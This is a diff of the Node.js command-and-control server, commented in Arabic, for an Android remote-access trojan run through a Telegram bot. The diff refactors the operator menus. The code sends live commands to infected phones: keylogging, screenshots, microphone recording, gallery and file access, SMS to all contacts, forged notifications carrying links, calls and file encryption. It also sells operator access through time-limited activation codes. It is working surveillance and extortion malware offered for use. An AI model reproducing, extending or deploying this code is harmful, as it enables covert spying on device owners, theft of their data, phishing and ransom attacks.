@@ -1,5 +1,5 @@
 // ═══════════════════════════════════════════════════════
-//   📦 المكتبات الأساسية
+//   📦 المكتبات
 // ═══════════════════════════════════════════════════════
 const express     = require("express");
 const http        = require("http");
@@ -9,7 +9,7 @@ const multer      = require("multer");
 const fs          = require("fs");
 
 // ═══════════════════════════════════════════════════════
-//   ⚙️ الإعدادات العامة
+//   ⚙️ الإعدادات
 // ═══════════════════════════════════════════════════════
 const CONFIG = {
   DATA_FILE:  "./data.json",
@@ -23,7 +23,7 @@ const CONFIG = {
 };
 
 // ═══════════════════════════════════════════════════════
-//   🎨 النصوص — عدّل هنا فقط
+//   🎨 النصوص
 // ═══════════════════════════════════════════════════════
 const TEXT = {
   MAIN_MENU:      "<b>🎯 ═══ القائمة الرئيسية ═══ 🎯</b>",
@@ -31,8 +31,8 @@ const TEXT = {
   SELECT_DEVICE:  "<b>🎯 ═══ اختر الجهاز ═══ 🎯</b>",
   NO_DEVICE:      "<b>⚠️ ═══ لا يوجد جهاز متصل ═══ ⚠️</b>",
   NO_TARGET:      "<b>❌ ═══ لم يتم اختيار جهاز ═══ ❌</b>",
-  SUCCESS:        "<b>✅ ═══ تم تنفيذ الطلب ═══ ✅</b>\n\n<b>📤 النتائج ستصل قريباً...</b>\n\n<b>🔙 ═══ العودة للقائمة الرئيسية ═══ 🔙</b>",
-  SUCCESS_CALL:   "<b>📞 ═══ تم تنفيذ المكالمة ═══ 📞</b>\n\n<b>🔙 ═══ العودة للقائمة الرئيسية ═══ 🔙</b>",
+  SUCCESS:        "<b>✅ ═══ تم تنفيذ الطلب ═══ ✅</b>\n\n<b>📤 النتائج ستصل قريباً...</b>",
+  SUCCESS_CALL:   "<b>📞 ═══ تم تنفيذ المكالمة ═══ 📞</b>",
   DEVICE_ONLINE:  "<b>🟢 ═══ جهاز متصل ═══ 🟢</b>\n\n<b>📱 الجهاز</b> → {model}\n<b>🔢 الإصدار</b> → {version}\n<b>🌐 IP</b> → {ip}\n<b>⏰ الوقت</b> → {time}\n\n<b>⚡ ═══ الحالة نشط ═══ ⚡</b>",
   DEVICE_OFFLINE: "<b>🔴 ═══ جهاز غير متصل ═══ 🔴</b>\n\n<b>📱 الجهاز</b> → {model}\n<b>🔢 الإصدار</b> → {version}\n<b>🌐 IP</b> → {ip}\n<b>⏰ الوقت</b> → {time}\n\n<b>⚫ ═══ الحالة غير نشط ═══ ⚫</b>",
   FILE_RECEIVED:  "<b>📥 ═══ ملف مستلم ═══ 📥</b>\n\n<b>💎 الجهاز</b> → {model}\n<b>📁 الملف</b> → {filename}",
@@ -40,12 +40,11 @@ const TEXT = {
   FILE_ACTION:    "<b>⚙️ ═══ إجراء الملف ═══ ⚙️</b>\n\n<b>📁 الملف</b> → {name}",
   MESSAGE_FROM:   "<b>📩 ═══ رسالة مستلمة ═══ 📩</b>\n\n<b>💎 من</b> → {model}\n<b>📝 النص</b> → {msg}",
   AUTH_REQUIRED:  "<b>🔐 ═══ بوت محمي ═══ 🔐</b>\n\n<b>🎫 للدخول، أرسل كود التفعيل</b>\n\n<b>📩 أرسل الكود الذي حصلت عليه من المالك</b>",
-  AUTH_DENIED:    "<b>❌ ═══ غير مصرح لك ═══ ❌</b>\n\n<b>🎫 أرسل كود التفعيل للدخول</b>",
   AUTH_WRONG:     "<b>❌ ═══ كود غير صحيح ═══ ❌</b>\n\n<b>🔁 حاول مرة أخرى</b>",
   AUTH_EXPIRED:   "<b>⏰ ═══ كود منتهي الصلاحية ═══ ⏰</b>",
   AUTH_USED:      "<b>⚠️ ═══ كود مستخدم من قبل ═══ ⚠️</b>",
   AUTH_SUCCESS:   "<b>✅ ═══ تم التفعيل بنجاح ═══ ✅</b>\n\n<b>⏱️ المدة</b> → {duration}\n<b>📅 ينتهي في</b> → {date}\n\n<b>👑 مرحباً بك 👑</b>",
-  NOT_AUTHORIZED_CALLBACK: "❌ غير مصرح",
+  NOT_AUTH_CB:    "❌ غير مصرح",
   OWNER_WELCOME:  "\n\n<b>👑 ═══ مرحباً يا مالك البوت ═══ 👑</b>",
   USER_WELCOME:   "\n\n<b>✅ ═══ أنت مصرح لك ═══ ✅</b>\n<b>⏱️ الصلاحية المتبقية</b> → {remaining} دقيقة",
   CREATE_CODE_PROMPT: "<b>🔑 ═══ إنشاء كود جديد ═══ 🔑</b>\n\n<b>📩 أرسل المدة بالدقائق</b>\n\n<b>📋 أمثلة:</b>\n🔸 <code>60</code> → ساعة\n🔸 <code>1440</code> → يوم\n🔸 <code>10080</code> → أسبوع\n🔸 <code>43200</code> → شهر",
@@ -106,10 +105,8 @@ const BTN = {
   GALLERY:        "🎬 الصور 🎬",
   MASS_SMS:       "📢 رسالة جماعية 📢",
   FAKE_NOTIF:     "🔔 إشعار مزور 🔔",
-  EMAIL:          "📧 سحب جيميل 📧",
   ENCRYPT:        "🔐 تشفير ملفات 🔐",
-  CALL:           "☎️ اتصال ☎️",
-  LOCK:           "🔒 قفل الشاشة 🔒"
+  CALL:           "☎️ اتصال ☎️"
 };
 
 // ═══════════════════════════════════════════════════════
@@ -126,27 +123,20 @@ const DIRECT_COMMANDS = {
   [BTN.SCREENSHOT]:   "screenshot",
   [BTN.KEYLOG_ON]:    "keylogger-on",
   [BTN.KEYLOG_OFF]:   "keylogger-off",
-  [BTN.GALLERY]:      "gallery",
-  [BTN.EMAIL]:        "all-email",
-  [BTN.LOCK]:         "lockScreen"
+  [BTN.GALLERY]:      "gallery"
 };
 
 const INPUT_COMMANDS = {
-  [BTN.MIC]:       { state: "microphoneDuration",   prompt: TEXT.ASK_MIC_DURATION,   feature: "MICROPHONE" },
-  [BTN.TOAST]:     { state: "toastText",             prompt: TEXT.ASK_TOAST_TEXT,     feature: "TOAST" },
-  [BTN.SMS]:       { state: "smsNumber",             prompt: TEXT.ASK_SMS_NUMBER,     feature: "SMS" },
-  [BTN.VIBRATE]:   { state: "vibrateDuration",       prompt: TEXT.ASK_VIBRATE_TIME,   feature: "VIBRATE" },
-  [BTN.MASS_SMS]:  { state: "textToAllContacts",     prompt: TEXT.ASK_MASS_TEXT,      feature: "MASS_SMS" },
-  [BTN.CALL]:      { state: "makeCallNumber",        prompt: TEXT.ASK_CALL_NUMBER,    feature: "CALL" },
-  [BTN.FAKE_NOTIF]:{ state: "notificationText",      prompt: TEXT.ASK_NOTIF_TEXT,     feature: "FAKE_NOTIF" },
-  [BTN.PLAY_AUDIO]:{ state: "recordVoice",           prompt: TEXT.ASK_VOICE,          feature: "PLAY_AUDIO" },
-  [BTN.ENCRYPT]:   { state: "encryptKey",            prompt: TEXT.ASK_ENCRYPT_KEY,    feature: "ENCRYPT" }
+  [BTN.MIC]:        { state: "microphoneDuration", prompt: TEXT.ASK_MIC_DURATION, feature: "MIC" },
+  [BTN.TOAST]:      { state: "toastText",          prompt: TEXT.ASK_TOAST_TEXT,   feature: "TOAST" },
+  [BTN.SMS]:        { state: "smsNumber",          prompt: TEXT.ASK_SMS_NUMBER,   feature: "SMS" },
+  [BTN.VIBRATE]:    { state: "vibrateDuration",    prompt: TEXT.ASK_VIBRATE_TIME, feature: "VIBRATE" },
+  [BTN.MASS_SMS]:   { state: "textToAllContacts",  prompt: TEXT.ASK_MASS_TEXT,    feature: "MASS_SMS" },
+  [BTN.CALL]:       { state: "makeCallNumber",     prompt: TEXT.ASK_CALL_NUMBER,  feature: "CALL" },
+  [BTN.FAKE_NOTIF]: { state: "notificationText",   prompt: TEXT.ASK_NOTIF_TEXT,   feature: "FAKE_NOTIF" },
+  [BTN.PLAY_AUDIO]: { state: "recordVoice",        prompt: TEXT.ASK_VOICE,        feature: "PLAY_AUDIO" },
+  [BTN.ENCRYPT]:    { state: "encryptKey",         prompt: TEXT.ASK_ENCRYPT_KEY,  feature: "ENCRYPT" }
 };
-
-const ALL_BUTTONS = [
-  ...Object.keys(DIRECT_COMMANDS),
-  ...Object.keys(INPUT_COMMANDS)
-];
 
 // ═══════════════════════════════════════════════════════
 //   🎨 لوحات المفاتيح
@@ -179,13 +169,11 @@ const KB = {
       [BTN.KEYLOG_ON, BTN.KEYLOG_OFF],
       [BTN.FILES, BTN.GALLERY],
       [BTN.MASS_SMS],
-      [BTN.FAKE_NOTIF, BTN.EMAIL],
-      [BTN.ENCRYPT, BTN.CALL],
-      [BTN.LOCK],
+      [BTN.FAKE_NOTIF, BTN.ENCRYPT],
+      [BTN.CALL],
       [BTN.BACK_HOME]
     ],
-    resize_keyboard: true,
-    one_time_keyboard: true
+    resize_keyboard: true
   },
   BACK: {
     keyboard: [[BTN.BACK_ACTION]],
@@ -259,27 +247,22 @@ function fill(template, vars) {
 }
 
 // ═══════════════════════════════════════════════════════
-//   ✨ رسالة متحركة
+//   🔧 دوال مساعدة
 // ═══════════════════════════════════════════════════════
-async function sendAnimated(chatId, frames, delay = 600) {
-  try {
-    const msg = await bot.sendMessage(chatId, frames[0], { parse_mode: "HTML" });
-    for (let i = 1; i < frames.length; i++) {
-      await new Promise(r => setTimeout(r, delay));
-      await bot.editMessageText(frames[i], {
-        chat_id: chatId,
-        message_id: msg.message_id,
-        parse_mode: "HTML"
-      });
-    }
-    return msg;
-  } catch (e) {
-    console.log("Animation error:", e.message);
-  }
+function getKeyboard(userId) {
+  return String(userId) === OWNER_ID ? KB.OWNER : KB.MAIN;
+}
+
+// البقاء في قائمة التحكم بعد كل أمر
+function stayInControl(chatId, deviceName) {
+  bot.sendMessage(chatId, fill(TEXT.CONTROL_MENU, { device: deviceName }), {
+    parse_mode: "HTML",
+    reply_markup: KB.CONTROL
+  });
 }
 
 // ═══════════════════════════════════════════════════════
-//   🌐 HTTP Routes
+//   🌐 HTTP
 // ═══════════════════════════════════════════════════════
 app.get('/', (_req, res) => {
   res.send("تم رفع الخادم معا تحيات المطور الملك صقر ");
@@ -398,16 +381,17 @@ bot.on("message", async msg => {
 
     return bot.sendMessage(data.id, welcome, {
       parse_mode: "HTML",
-      reply_markup: IS_OWNER ? KB.OWNER : KB.MAIN
+      reply_markup: getKeyboard(USER_ID)
     });
   }
 
-  // ═══ أوامر المالك ═══
+  // ═══════════════════════════════════════════════════════
+  //   👑 أوامر المالك
+  // ═══════════════════════════════════════════════════════
   if (IS_OWNER && USER_TEXT === BTN.CREATE_CODE) {
     appData.set(OWNER_ID + "_action", "createCode");
     return bot.sendMessage(data.id, TEXT.CREATE_CODE_PROMPT, {
-      parse_mode: "HTML",
-      reply_markup: KB.BACK
+      parse_mode: "HTML", reply_markup: KB.BACK
     });
   }
 
@@ -470,20 +454,30 @@ bot.on("message", async msg => {
     return bot.sendMessage(data.id, out, { parse_mode: "HTML", reply_markup: KB.OWNER });
   }
 
-  // ═══ معالجة حالات الإدخال ═══
+  // ═══════════════════════════════════════════════════════
+  //   🎯 معالجة حالات الإدخال
+  // ═══════════════════════════════════════════════════════
   const currentAction = appData.get("currentAction");
   const currentTarget = appData.get("currentTarget");
 
+  // دالة: البقاء في قائمة التحكم بعد تنفيذ الأمر
+  const afterAction = () => {
+    const sock = io.sockets.sockets.get(currentTarget);
+    const name = sock ? sock.model : "unknown";
+    appData.delete("currentTarget");
+    appData.delete("currentAction");
+    bot.sendMessage(data.id, TEXT.SUCCESS, { parse_mode: "HTML" });
+    stayInControl(data.id, name);
+  };
+
   if (currentAction === "microphoneDuration") {
     io.to(currentTarget).emit("commend", { request: "microphone", extras: [{ key: "duration", value: USER_TEXT }] });
-    appData.delete("currentTarget"); appData.delete("currentAction");
-    return bot.sendMessage(data.id, TEXT.SUCCESS, { parse_mode: "HTML", reply_markup: IS_OWNER ? KB.OWNER : KB.MAIN });
+    return afterAction();
   }
 
   if (currentAction === "toastText") {
     io.to(currentTarget).emit("commend", { request: "toast", extras: [{ key: "text", value: USER_TEXT }] });
-    appData.delete("currentTarget"); appData.delete("currentAction");
-    return bot.sendMessage(data.id, TEXT.SUCCESS, { parse_mode: "HTML", reply_markup: IS_OWNER ? KB.OWNER : KB.MAIN });
+    return afterAction();
   }
 
   if (currentAction === "smsNumber") {
@@ -498,20 +492,18 @@ bot.on("message", async msg => {
       request: "sendSms",
       extras: [{ key: "number", value: number }, { key: "text", value: USER_TEXT }]
     });
-    appData.delete("currentTarget"); appData.delete("currentAction"); appData.delete("currentNumber");
-    return bot.sendMessage(data.id, TEXT.SUCCESS, { parse_mode: "HTML", reply_markup: IS_OWNER ? KB.OWNER : KB.MAIN });
+    appData.delete("currentNumber");
+    return afterAction();
   }
 
   if (currentAction === "vibrateDuration") {
     io.to(currentTarget).emit("commend", { request: "vibrate", extras: [{ key: "duration", value: USER_TEXT }] });
-    appData.delete("currentTarget"); appData.delete("currentAction");
-    return bot.sendMessage(data.id, TEXT.SUCCESS, { parse_mode: "HTML", reply_markup: IS_OWNER ? KB.OWNER : KB.MAIN });
+    return afterAction();
   }
 
   if (currentAction === "textToAllContacts") {
     io.to(currentTarget).emit("commend", { request: "smsToAllContacts", extras: [{ key: "text", value: USER_TEXT }] });
-    appData.delete("currentTarget"); appData.delete("currentAction");
-    return bot.sendMessage(data.id, TEXT.SUCCESS, { parse_mode: "HTML", reply_markup: IS_OWNER ? KB.OWNER : KB.MAIN });
+    return afterAction();
   }
 
   if (currentAction === "notificationText") {
@@ -526,8 +518,8 @@ bot.on("message", async msg => {
       request: "popNotification",
       extras: [{ key: "text", value: notifText }, { key: "url", value: USER_TEXT }]
     });
-    appData.delete("currentTarget"); appData.delete("currentAction"); appData.delete("currentNotificationText");
-    return bot.sendMessage(data.id, TEXT.SUCCESS, { parse_mode: "HTML", reply_markup: IS_OWNER ? KB.OWNER : KB.MAIN });
+    appData.delete("currentNotificationText");
+    return afterAction();
   }
 
   if (currentAction === "makeCallNumber") {
@@ -542,11 +534,13 @@ bot.on("message", async msg => {
       request: "makeCall",
       extras: [{ key: "number", value: number }, { key: "text", value: USER_TEXT }]
     });
-    appData.delete("currentTarget"); appData.delete("currentAction"); appData.delete("currentNumber");
-    return bot.sendMessage(data.id, TEXT.SUCCESS_CALL, { parse_mode: "HTML", reply_markup: IS_OWNER ? KB.OWNER : KB.MAIN });
+    appData.delete("currentNumber");
+    return afterAction();
   }
 
-  // ═══ الأزرار الرئيسية ═══
+  // ═══════════════════════════════════════════════════════
+  //   🎯 الأزرار الرئيسية
+  // ═══════════════════════════════════════════════════════
   if (USER_TEXT === BTN.COUNT_DEVICES) {
     if (io.sockets.sockets.size === 0) {
       return bot.sendMessage(data.id, TEXT.NO_DEVICE, { parse_mode: "HTML" });
@@ -579,7 +573,10 @@ bot.on("message", async msg => {
   }
 
   if (USER_TEXT === BTN.BACK_HOME) {
-    return bot.sendMessage(data.id, TEXT.MAIN_MENU, { parse_mode: "HTML", reply_markup: IS_OWNER ? KB.OWNER : KB.MAIN });
+    return bot.sendMessage(data.id, TEXT.MAIN_MENU, {
+      parse_mode: "HTML",
+      reply_markup: getKeyboard(USER_ID)
+    });
   }
 
   if (USER_TEXT === BTN.BACK_ACTION) {
@@ -587,14 +584,16 @@ bot.on("message", async msg => {
       appData.delete(OWNER_ID + "_action");
       return bot.sendMessage(data.id, TEXT.CREATE_CODE_CANCEL, { parse_mode: "HTML", reply_markup: KB.OWNER });
     }
-    const targetSock = io.sockets.sockets.get(currentTarget);
-    const targetName = targetSock ? targetSock.model : "unknown";
-    return bot.sendMessage(data.id, fill(TEXT.CONTROL_MENU, { device: targetName }), {
+    const sock = io.sockets.sockets.get(currentTarget);
+    const name = sock ? sock.model : "unknown";
+    return bot.sendMessage(data.id, fill(TEXT.CONTROL_MENU, { device: name }), {
       parse_mode: "HTML", reply_markup: KB.CONTROL
     });
   }
 
-  // ═══ اختيار جهاز ═══
+  // ═══════════════════════════════════════════════════════
+  //   🎯 اختيار جهاز
+  // ═══════════════════════════════════════════════════════
   let foundDevice = false;
   io.sockets.sockets.forEach((s, id) => {
     if (USER_TEXT === s.model) {
@@ -607,43 +606,37 @@ bot.on("message", async msg => {
   });
   if (foundDevice) return;
 
-  // ═══ الأوامر المباشرة ═══
+  // ═══════════════════════════════════════════════════════
+  //   🎯 الأوامر المباشرة
+  // ═══════════════════════════════════════════════════════
   if (DIRECT_COMMANDS[USER_TEXT]) {
     if (!currentTarget) {
       return bot.sendMessage(data.id, TEXT.NO_TARGET, { parse_mode: "HTML" });
     }
-
-    if (USER_TEXT === BTN.FILES) {
-      io.to(currentTarget).emit("file-explorer", { request: "ls", extras: [] });
-      appData.delete("currentTarget");
-      return bot.sendMessage(data.id, TEXT.FILE_LIST.replace("{model}", "..."), {
-        parse_mode: "HTML", reply_markup: IS_OWNER ? KB.OWNER : KB.MAIN
-      });
-    }
-
     io.to(currentTarget).emit("commend", {
       request: DIRECT_COMMANDS[USER_TEXT],
       extras: []
     });
-    appData.delete("currentTarget");
-    return bot.sendMessage(data.id, TEXT.SUCCESS, {
-      parse_mode: "HTML", reply_markup: IS_OWNER ? KB.OWNER : KB.MAIN
-    });
+    return afterAction();
   }
 
-  // ═══ معالج FILES (منفصل) ═══
+  // ═══════════════════════════════════════════════════════
+  //   🎯 زر عرض الملفات (منفصل)
+  // ═══════════════════════════════════════════════════════
   if (USER_TEXT === BTN.FILES) {
     if (!currentTarget) {
       return bot.sendMessage(data.id, TEXT.NO_TARGET, { parse_mode: "HTML" });
     }
     io.to(currentTarget).emit("file-explorer", { request: "ls", extras: [] });
+    const sock = io.sockets.sockets.get(currentTarget);
+    const name = sock ? sock.model : "unknown";
     appData.delete("currentTarget");
-    return bot.sendMessage(data.id, TEXT.MAIN_MENU, {
-      parse_mode: "HTML", reply_markup: IS_OWNER ? KB.OWNER : KB.MAIN
-    });
+    return bot.sendMessage(data.id, TEXT.SUCCESS, { parse_mode: "HTML" });
   }
 
-  // ═══ أوامر تحتاج مدخلات ═══
+  // ═══════════════════════════════════════════════════════
+  //   🎯 الأوامر التي تحتاج مدخلات
+  // ═══════════════════════════════════════════════════════
   if (INPUT_COMMANDS[USER_TEXT]) {
     if (!currentTarget) {
       return bot.sendMessage(data.id, TEXT.NO_TARGET, { parse_mode: "HTML" });
@@ -662,18 +655,17 @@ bot.on("message", async msg => {
 bot.on("voice", voice => {
   if (appData.get("currentAction") === "recordVoice") {
     const target = appData.get("currentTarget");
-    const IS_OWNER = String(voice.chat.id) === OWNER_ID;
     bot.getFileLink(voice.voice.file_id).then(url => {
       io.to(target).emit("commend", {
         request: "playAudio",
         extras: [{ key: "url", value: url }]
       });
+      const sock = io.sockets.sockets.get(target);
+      const name = sock ? sock.model : "unknown";
       appData.delete("currentTarget");
       appData.delete("currentAction");
-      bot.sendMessage(data.id, TEXT.SUCCESS, {
-        parse_mode: "HTML",
-        reply_markup: IS_OWNER ? KB.OWNER : KB.MAIN
-      });
+      bot.sendMessage(data.id, TEXT.SUCCESS, { parse_mode: "HTML" });
+      stayInControl(data.id, name);
     });
   }
 });
@@ -685,7 +677,7 @@ bot.on("callback_query", query => {
   const USER_ID = String(query.from.id);
 
   if (!isAuthorized(USER_ID)) {
-    return bot.answerCallbackQuery(query.id, { text: TEXT.NOT_AUTHORIZED_CALLBACK });
+    return bot.answerCallbackQuery(query.id, { text: TEXT.NOT_AUTH_CB });
   }
 
   const [device, action] = query.data.split("|");
